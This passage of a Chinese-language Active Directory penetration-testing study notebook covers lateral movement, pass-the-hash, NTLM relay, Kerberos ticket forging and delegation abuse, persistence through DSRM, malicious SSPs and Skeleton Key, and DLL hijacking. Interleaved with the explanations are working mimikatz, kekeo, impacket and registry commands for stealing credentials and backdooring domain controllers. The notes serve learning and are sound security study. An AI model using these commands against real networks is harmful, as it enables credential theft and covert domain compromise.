2. OpenSCManager打开句柄，CreateService创建服务，StartService启动服务（这里有一篇2008年逆向PSEXEC的[文章](http://blog.chinaunix.net/uid-7461242-id-2051697.html)）
3. 客户端连接并且执行命令，服务端启动相应程序并执行回显
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/psexec_start.png)
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/psexec_file.png)

所以明白了传统PSEXEC的缺点，即特征明显（而且确实比较老了
但是在没有防护设备的情况下，这个确实很方便（毕竟cs里面也内置了psexec作为横向的工具

#### wmi

> 刚好记得，前几天360团队掏出了一个[wmihacker](https://github.com/360-Linton-Lab/WMIHACKER)，玩了一下觉得挺好滴

其实看下helper就会用了

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/wmihacker_usage.png)

挺好使
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/wmihacker.png)

或者用自带的wmic也行

#### schtasks

定时任务，直接搬运指令作为记录

```powershell
schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru "SYSTEM"  /tn "windowsupdate" /sc DAILY  /tr "calc" /F

schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate
```

#### at

计划任务，也没啥好说滴
`at \\1.1.1.1 15:15 calc`

#### sc

sc.exe是一个命令行下管理本机或远程主机服务的工具，具体看 help ~

#### DCOM

> 20200804 - 中间做开发去了，回来慢慢填坑

首先还是老样子，什么是DCOM？（看完之后去搬运了一点点）DCOM即（Distributed Component Object Module）分布式组件对象模型，是一系列微软的概念和程序接口(当然一看就是基于COM的)，通过DCOM，客户端程序对象能够向网络中的另外一台计算机的程序对象发起请求。
同时发现三好学生师傅的[博文](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)里也有了，拜读完之后默默补上...因为文章中的操作涉及到Powershell的版本问题，这里先抛出Powershell查询版本的语句：`$PSVersionTable.PSVersion`\# 商业转载请联系作者获得授权，非商业转载请注明出处。

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")
```

此命令为本地命令执行，在实际运用的时候，需要先建立 $IPC 连接，替换127.0.0.1和要执行的命令即可

#### **WinRM**

> WinRM（Windows Remote Management）即windows远程管理，基于Web服务管理。感觉就像是SSH ~

用账号密码即可远程连接，我本地配置的时候有点问题（设置了TrustedHosts还是不成功...），所以先记录一下指令
`winrs -r:http://targetip:5985 -u:Administrator -p:password "whoami"`
一般来说，5985是http，5986是https

### PTH

> PTH在讲NTLM认证的时候已经阐述过了，这里主要是传递的方式，这部分之前复现过了。和PTH紧密相关的是KB2871997这个补丁，但是sid为500的管理员账户仍可进行PTH，也可以使用AES-256密钥进行PTH攻击
> 20200921更新:刚打完h*，这回运用到了smb beacon和工作组下的pth。在cs下，工作组的pth填写时，domain值是任意的，不填也可以，之前一直认为要填写主机名或者workgroup，后来想了想在工作组环境下不是直接就行了（参考SMB爆破）。

#### impacket

#### Invoke-TheHash

#### Mimikatz使用

```mimikatz
privilege::debug
sekurlsa::pth /user:dc /domain:xxcom.local /ntlm:xxxx
```

~~msf和cs下，之后放上来~~

### NTLM-Relay

> 这个之前摸过了，感觉这种情况实际用的比较少，算是比较被动的方式~觉得主要围绕Responder这个工具展开，之前玩了一圈，好像没写文章发出来，这里就稍做记录吧...

#### 攻击手法1

Responder -b 强制开启401认证，触发场景就是用户访问一个网站，弹出小框框，在内网下捕获（总觉得挺明显的）

#### 攻击手法1.1

> 这个没看过，看了介绍就是因为都能控制PAC了，那直接让用户流量走我们的机器过...（PS 非域内）

~~这个还没手动做过，又mark一下~~

msf指令

```msf
use auxiliary/spoof/nbns/nbns_response
set regex WPAD
set spoofip attackip
run
use auxiliary/server/wpad
set proxy 172.16.127.155
run
```

#### 攻击手法2.0

> 这个挺有意思的，mark一下 -> responder关闭smb，开启ntlmrelayx.py，做ntlm-relay

### 域信任（暂不全）

> 这里搭建的时候是单域环境，没有做多域环境...又先埋一个小坑...

为了方便理解，直接从jumbo大佬的文章里把这个图搬运过来

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/domain_trust.png)

可以看到跨域请求资源的时候，先在本机上完成了kerberos认证的前两步，之后与另外一个域上的DC的TGS进行交互，获得ST后访问目标server。蓝军中提到的情况是子父域的情况。找到了一篇对应的[文章](https://www.cnblogs.com/zpchcbd/p/12215646.html)，也是在同一域树下通过（Golden Ticket + Sid History的方式，即下面提到的增强票据，完成子域向父域的提权）

1. `lsadump::lsa /patch` 抓一下本机krbtgt的账号密码
2. `Get-DomainComputer  -Domain xxx.xxx` 获得父域的sid，然后添加父域sid管理员账号

3. `kerberos::golden /user:Administrator /krbtgt:子域的KRBTGT_HASH /domain:子域的名称 /sid:S-1-5-21-子域的SID /sids:S-1-5-根域-519 /ptt`

其中的519代表`Enterprise Admins`的RID（仅出现在根域中）

~~说实话，这里没实操我没看懂，不过我mark了，后面搭起来了回头重新摸一下，这个摊开讲也能讲很多滴...~~（菜哭了

### 攻击Kerberos

#### 金票

看过了，略

在看[这篇文章](https://www.freebuf.com/articles/system/197160.html)的时候，看到了增强票据，可以跨域使用。这与SIDHistory有关，然后这个东西好像已经很早了（在CSDN看到一篇2004年的文章...至于利用是在2015的Black Hat），在adsecurity上的[文章](https://adsecurity.org/?p=1640)。
因为目前是单域环境，即当前域为根域，所以能看到Enterprise Admins和Domain Admins，而子域下是不存在Enterprise Admins
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/enterprise.png)

`whoami /all` 可以看到，这个的RID为519
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/enterprise_powershell.png)

由于没有搭设子域环境，我们假设子域中的 `sid` 为A-XXX，而当前根域的 `Enterprise Admins` 为B-519，那么上面提到的域信任提权组成的为A-519，这个SID在整个域林中是不存在的。
这与SID History有关系，SID History本身的作用是，在域迁移之后仍然保持原来的权限，可以访问原先的资源。子父域双向信任同理。

##### 参考1

[安全客文章](https://www.anquanke.com/post/id/172900#h3-8)

~~还是埋一个小小坑，在搭建完多域环境后再进行补充~~

#### 银票

看过了，略

#### 委派

> 这里是一个知识盲区，去年打3CTF的时候，是360红队出的题目，那个时候wuppp大佬讲wp的时候就一直提到基于委派，基于委派...那个时候kerberos都看不利索，理解费劲，如今碰到，趁机好好看看
> 这样的场景应该还是比较常见的...

先去摸一摸文章，发现云影实验室写的[这篇](https://www.freebuf.com/articles/system/198381.html)真好，就跟着摸索一遍吧...

Client ======> HTTP =======> SQLServer
当Client请求主机上的HTTP服务，HTTP服务要去SQLServer上去取数据请求，但是HTTP主机并不知道Client是否能去请求SQLserver，于是会使用Client的身份权限去访问SQLserver，如果有权限则访问成功。
委派又分为非约束委派和约束委派，两种的区别和实现是怎么样的呢，马上去看看，为了方便理解，我自己跟着画了一遍

##### 非约束委派

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/kerberos委派.png)

这个TGT的转发机制并没有限制service 1对TGT2的使用
这时候去看一下用户属性中的委派，去截个图，发现主机上没有提供服务的好像没有委派这个选项（也是...没有Service拿啥委派呢...应该没有理解错吧），于是找到了有mssql的web服务器，截了个图如下所示：
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/非约束委派.png)

看到了非约束委派的不安全性，`Service 1`拿着TGT2这个票据其实可以请求别的去了，不一定是`Service 2`，也可以是`Service 3`，`Service 4`....当然了，拿的是Client的TGT，所以能访问到的必须要有对应的权限（如果拿到了高权限-如域管，那危害就很大了）。

##### 约束委派

由于这个不安全性，微软在2003年推出了约束委派功能。很明显，直接把TGT交给Service 1是不安全的，因此对service 1的认证信息做了限制。这里有一组扩展协议，叫做**S4U2Self**（Service for User to Self）**协议转换**和**S4U2Proxy**（Service for User to Proxy）**约束委派**，这俩究竟是啥呢...让我们继续看看，还是先自己画一下帮助理解
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/约束委派.png)

这里步骤2中的`S4U2Self`扩展的作用是先与KDC先校验用户的合法性，让服务从非 `Kerberos` 协议“转换”至 `Kerberos` 认证，获得一个可以转发的`ST1`。`S4U2Proxy`的作用是让`Service 1` 拿着ST1去获取ST2，在图中没画出来，是步骤6。同样的去设置看一眼
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/约束委派_设置.png)

好吧，后来觉得自己这一个理解的还是不够深刻，[绿盟](http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/)的这篇文章还是非常好的，可以认真看看

##### 基于资源的约束委派

> 这个在Ateam的[文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#43-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE)里面也有，其实我看非约束还好，能理解，约束有点硬，基于资源的就头晕了哈哈哈，不过Ateam的大佬也说了，这个整个过程非常复杂，能简单理解就行啦！

我就直接搬运简而言之：
基于资源的约束委派可以通过直接在主机上设定`msDS-AllowedToActOnBehalfOfOtherIdentity`属性来设置，如果我们可以修改该属性，那么我们就能拿到一张域管理员的票据，但该票据只对这台机器(dev1)生效，然后拿这张票据去对这台机器(dev1)进行认证
再简单一点就是，A机器设置了基于资源的约束委派给B机器，B机器就可以通过s4u协议申请高权限反向对A进行利用（太骚了）
虽然这个高权限只能给一台机器（A）使用，但是我觉得这个还是挺好的，直接最高权限拿下一台，再抓密码又能继续玩了
这里没有实操，我记下了下回一定，~~这里纯搬运了，我哭了~~

查找一下有基于资源委派的：

```powershell
get-adcomputer 账户名 -properties principalsallowedtodelegatetoaccount
```

通过S4U协议申请一个高权限的：

```ppowershell
getST.py -dc-ip 10.10.10.10 xxcom.local/spnspnspn\$:spnspnspn -spn cifs/web.xxcom.local -impersonate administrator
```

```shell
export KRB5CCNAME=administrator.ccache
```

##### 查找约束与非约束委派

> 用到老朋友PowerSploit了

导入 `PowerSploit\Recon\PowerView.ps1` ，因为就开了两台机器，我们修改一下走过过场

1. 查询域内非约束
   账户查询：命令 `Get-NetUser Unconstrained -Domain xxcom.local`
   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/查询非约束.png)
   主机查询（就不重复贴图了）：`Get-NetComputer Unconstrained -Domain xxcom.local`

2. 查询域内约束
   查看用户：`Get-DomainUser -TrustedToAuth -Domain xxcom.local`

   查看主机：`Get-DomainComputer -TrustedToAuth -Domain xxcom.local`

##### 非约束委派的利用

> 刚开始看目录都失败了5555原来是忘记给他加到dns记录里面

用域控上的administrator去访问web

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/dir.png)

在web主机上起个猕猴桃 `sekurlsa::tickets /export` 找到那个TGT票据
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/mimikatz_tickets.png)

在猕猴桃中把这个票据导入即可，其实也是PTT攻击（想一下拿到 Administrator的TGT票据，那不就和拿了黄金票据的目的一样嘛）
指令为`kerberos::ptt xxxx.kirbi`
还有一个点刚学到的，`sekurlsa::tickets`是内存中所有的，而`kerberos::list` 是当前会话中的，所以sekurlsa需要提权至system下进行利用。非约束委派的那个图里画了，TGT是会被放在内存中的，所以用猕猴桃可以抓到

[*] 注：不过有一个人在下面回复了，TGT票据一段时间后消失了，这里有点好奇这个TGT在内存里的缓存时间是多久？

##### 约束委派的利用

> 用到了一个新的工具，kekeo

原理流程简易版：

1. 申请TGT
2. 利用TGT获取ST
3. 导入ST

一步步来，跟着摸一遍吧...首先用kekeo获取TGT

```shell
tgt::ask /user:web /domain:xxcom.local /password:1qaz@WSX
```

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/约束1.png)

利用TGT去申请两个ST。问题来了，为什么是两个。其中一个ST是验证自身的，另外一个ST就是 S4U2Proxy 扩展中申请的TGS票据

`tgs::s4u /tgt:xxxxx /user:administrator@xxcom.local /service:cifs/dc.xxcom.local`

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/约束2.png)

最后mimikatz导入

```shell
mimikatz:
kerberos::ptt xxx
```

## 0x07 权限维持

> 拿下域控后，即使管理员密码改了，还能继续维持住权限，这个摊开讲也好多呀...目前的我好像还用不到这么多的维权的方式，先记下几个吧（之后有空的时候再继续复现，希望能在实战中多多运用~），不做无意义的搬运工了
> 20200809，其实目前自己看到的后门，还是比较落后的。不过不能嫌弃它落后，毕竟我还不会。比较常见的就是写定时任务，dll劫持，写自启，shift后门，wsman等。这里也有很大的学问！在adsecurity上找到了一个持久化的[checklist](https://adsecurity.org/?p=1929)，虽然是15年的，仍有一定的参考价值

### DSRM

> 更新于20200809

首先还是需要知道，什么是DSRM，看完之后开始搬运

**基础知识**
DSRM（Directory Services Restore Mode）即目录服务恢复模式，是Windows服务器域控制器的安全模式启动项。允许管理员来修复或还原修复或重建活动目录数据库。而在后续的文章中，主要提到的是用DSRM的密码同步功能实现域管权限持久化。该方法本质上就是重置了DC上本地管理员的密码（注意区分，是本地管理员不是域管）

**实际操作**
其实刚开始看这个有点迷惑，因为在[Freebuf上的文章](https://www.freebuf.com/articles/system/80968.html)，评论里也好多怪怪的...于是找到adsecurity上的[文章](https://adsecurity.org/?p=1785)，拜读一下。

首先在域控上DSRM密码

```shell
ntdsutil
set DSRM password
SYNC FROM DOMAIN ACCOUNT username
Q
Q
```

然后需要修改注册表，使得DSRMAdminLogonBehavior的值为2

```shell
reg add  " HKLM\System\CurrentControlSet\Control\Lsa" /v  DSRMAdminLogonBehavior /t REG_DWORD /d 2
```

至于2的含义，我从上面提到的Freebuf的文章搬运了一部分

- 0（默认值）：只有当DC重启进入DSRM时，你才能使用DSRM管理员帐户。
- 1：只有当本地AD DS服务停止时，你才能使用DSRM管理员帐户登录。
- 2：无论哪一种情况，你都可以使用DSRM管理员帐户登录。（并不推荐此设置，因为密码策略并不会应用到DSRM的管理员帐户）

最后就直接pth到域控上即可。需要注意的是，该方式仅适用于(windows server2008和更高的版本)

### GPO

上面讲过，略

### 金票(Golden Ticket)

略

### SSP

> 更新于20200809

菜醒，想起自己权限维持还没有写，正好逛先知的时候看到了，就继续更新吧~首先，还是先奉上[文章地址](https://xz.aliyun.com/t/7432)

- 基础知识
SSP（Security Support Provider）是windows操作系统安全机制的提供者。主要用于为windows认证相关提供服务，如NTLM、Kerberos等。使用SSP进行权限维持的原理为：系统启动时，lsass.exe作为系统进程，会加载SSP（其实就是dll啦~我的简单理解就是提供认证相关的一个dll），但是如果这时候加载的是恶意的dll，就能获取到明文密码（在打了1997的补丁机器，默认WDigest不开启，在需要知道明文密码却不能破解的情况下，可以使用这个方式获取到明文密码，即便用户更改密码，也能够获取到）

- 实现方式如下

1. mimikatz注入内存

mimikatz提供了将恶意SSP注入内存的方法，既然是注入内存中，自然是不能在重启后保留。它的触发条件为用户注销后重新登录（即在机器不关闭的情况下，重新触发LSA认证），优点在于没有文件落地，直接加载到内存了，mimikatz的指令如下

```shell
privilege::debug
misc::memssp
```

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ssp1.png)

在 `C:\Windows\system32\mimilsa.log` 下可以看到用户的明文密码，如下

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/mimilsa.png)

个人认为这种情况下比较少吧...或许需要在不跑服务的域内个人机器，注销当前用户来让用户自己重新输入吧...

2.注册表

将mimikatz中的mimilib.dll文件copy至C:\Windows\system32目录下，并添加到注册表中即可。这里做一个朴实无华的搬运工

```cmd
copy mimilib.dll %systemroot%\system32
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```

明文会被记录在 `C:\Windows\system32\kiwissp.log` 下面

- 自我感想
对于这种需要重启（注销）生效的，我比较困惑。在实际的内网渗透中，真的会使用这样的方法去捕获明文密码吗？出于困惑，去问了问群里的师傅，对于服务类的，如跑着web服务器，数据库服务器的，这种机器可能一年都不会重启一次。所以这种攻击方式，可能更加适用于域内的个人PC机，通过强制注销等来获取密码。（不过我觉得还是太过于被动了，人为触发不稳定）
这种获取明文的方式，其实和修改注册表中的WDigest值一样，需要主动锁屏，所以个人PC机上会比较好用

### **Skeleton Key**

> 相比与SSP的注销（重启）触发，Skeleton Key则是一种不需要且较好使用的方法~

使用mimikatz即可，适用版本在windows 2003 - 2012r2

```shell
privilege::debug
misc::skeleton
```

之后就可以使用 "mimikatz" 作为后门密码去连接域控。其原理是直接对lsass.exe进行注入

## 0x08 免杀绕过

> 这是一个绕不过的话题，在本地搭建的环境中，往往不会给自己增加过多的对抗。而显示情况下，对方往往有杀软，HIDS，流量监控等等。免杀绕过是一个永恒的问题，同样的我目前还是做的比较浅。还是同样的，遇到了，就记录下来

记群里师傅的话：**dll劫持服务（如双dll做函数转发），pe感染，比较主流的两个过杀软维权方式**

### DLL相关

什么是DLL劫持?Dll(Dynamic Link Library)即动态链接库。当程序运行时，首先在当前程序所在目录加载DLL文件，如果没有则到Windows系统目录，最后再到环境变量中去遍历。若当某应用程序没有对DLL本身做校验，通过导出输出表，使每个函数转向真正的Dll，再将代码穿插在Dll中，即实现了劫持

#### DllMain

> 学习参考[链接](https://payloads.online/archivers/2019-10-02/1)如下，倾旋的文章写的非常详细，我就先搬运一部分了

1. 程序调用 Dll 中导出函数的流程
   帮助我们理解dll加载，这里就直接搬运了
   - 程序调用Windows API `LoadLibrary`
   - 操作系统寻找 `LoadLibrary` 所加载的DLL文件
   - 操作系统将DLL文件加载至目标程序进程的内存空间
   - 程序自动调用 `DllMain` 函数
   - 程序调用DLL中导出函数

2. 从一段代码阐述DllMain（从xx师傅学习来）

   ```cpp
   #include "pch.h"
   #include <iostream>
   #include <Windows.h>

   extern "C" __declspec(dllexport) void printMessageBox()
   // 导出函数，实例中运用到的dllexport用于在dll中将函数、类等申明为导出函数，供其他程序调用
   // 对应的还有dllimport，用于从别的动态链接库中导入函数、类、对象等供本地动态库或者exe调用
   {
      int x;
      x = MessageBoxA(GetForegroundWindow(), "Hello World", "by testdll", 1);
   }

   BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
   {
      switch (ul_reason_for_call)
      {
      case DLL_PROCESS_ATTACH:
         int x;
         x = MessageBoxA(GetForegroundWindow(), "Dll main~", "chriskali", 1);
         break;
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
      case DLL_PROCESS_DETACH:
         break;
      }
      return TRUE;
   }
   ```

   下面为调用上述Dll的主程序（从一位不知名的群友学习）

   ```cpp
   #include <iostream>
   #include <windows.h>
   #include <tchar.h>

   int main()
   {
      typedef int (*_ptestprint)(); //这是一个函数指针
      typedef int (*_ptestint)(int a, int b); //带参数的函数指针

      HINSTANCE hDll = LoadLibrary("Dll1.dll"); // 加载DLL
      int nError = GetLastError();
      std::cout << nError << std::endl;
      std::cout << "[+] StartLoad" << std::endl;
      if (hDll != NULL) // 判断是否读到了,读不到就为NULL
      {
         std::cout << "[+] In" << std::endl;
         _ptestprint ptest = (_ptestprint)GetProcAddress(hDll, "printMessageBox"); //获取dll中的函数
         ptest(); //函数调用
         FreeLibrary(hDll);
         std::cout << "done!" << std::endl;
      }
      else
      {
         std::cout << "[-] Not Loaded" << std::endl;
      }
      return 0;
   }
   ```

   下面的讲解基本基于上述的代码
   首先，先看一下DllMain的原型（照搬）

   ```cpp
   BOOL WINAPI DllMain(
      _In_ HINSTANCE hinstDLL, // 指向自身的句柄
      _In_ DWORD fdwReason, // 调用原因
      _In_ LPVOID lpvReserved // 隐式加载和显式加载
   );
   ```

   运行上述的代码后，会按照如下图片执行。`DllMain`会在导入时优先调用，其中 `DLL_PROCESS_ATTACH` 十分关键，它会在首次被加载的时候运行。
   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/dll1.png)
   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/dll2.png)

#### 实际场景（同样也是从xx师傅学习）

查看程序运行时加载的官方工具[Process Explorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer)

##### 白加黑

> 白加黑，多么熟悉的名词。当时觉得自己是一个WEB选手，不需要知道这些。现在发现还是很有学习的必要的，要努力成为一个全能的选手

自己对白加黑的理解：
白：在白名单中的程序，一些正常的程序（如能从360软件管家下载的软件）来规避杀毒软件
黑：恶意的DLL。通常我们使用的方式为上述代码中的，在`DllMain`中的`DLL_PROCESS_ATTACH`实现恶意行为，他会在Dll被初次加载的时候调用

当看到这一块的时候，对这样的劫持有个疑惑：通过替换Dll程序来劫持，不是会让程序异常退出然后退出进程吗？这里的猜测是让程序直接阻塞在`DllMain`里（估计理解有偏差）

##### Dll转发

> 在自启动服务中，不希望破坏原有的服务，那么就不能和白加黑一样不论程序是否崩溃，需要保持程序启动后正常运行

这里暂时没玩明白，只能记录一个大概，等会了再传上来。

1. 函数转发
2. 在dllmain中加载被劫持的dll，然后修改loaddlibrary地址为被劫持后的模块句柄 - 搬运自某大佬[博客](https://anhkgg.com/dllhijack/)(大概觉得像个中间人)

## 总结

总结：其实中间还有很多含糊的地方，虽然说是手动搭建全实现，但是有好多还是搬运的...不过搬运前我还是好好看了一遍，有些暂时理解不了或者没有遇到的情况，我都mark了一下。(另：免杀篇我也打算慢慢看，为了防止都是囫囵吞枣而去到处搬运，我想先放置一下，等到有一定理解了，再做更新。PS:免杀篇的Powershell执行好像已经不行了...
中间可能会有很多出错的地方，这是我入门内网渗透的一次小小的总结，慢慢的从纯理论到上手操作，结合之前已有的、不多的内网经验，慢慢学习。后面尽力实战吧~从实战中学习，实战中发现。这个总结也是我的一个handbook，我学到了新东西会慢慢添加，不对的希望各位指出改正，希望能有进步吧\~
2020-07-20

在第一版中花费了比较多的时间入门，第二版会在后期的3-6个月内更迭。主要是基于cobaltstrike的从入门到配置，以及如何将上述的一些学习点在cobaltstrike和实战中运用起来，这是我后面的一个小计划。同时java这一部分可能也会慢慢开始看，所以进度会放缓，但是学习是不会停止的
2020-08-15
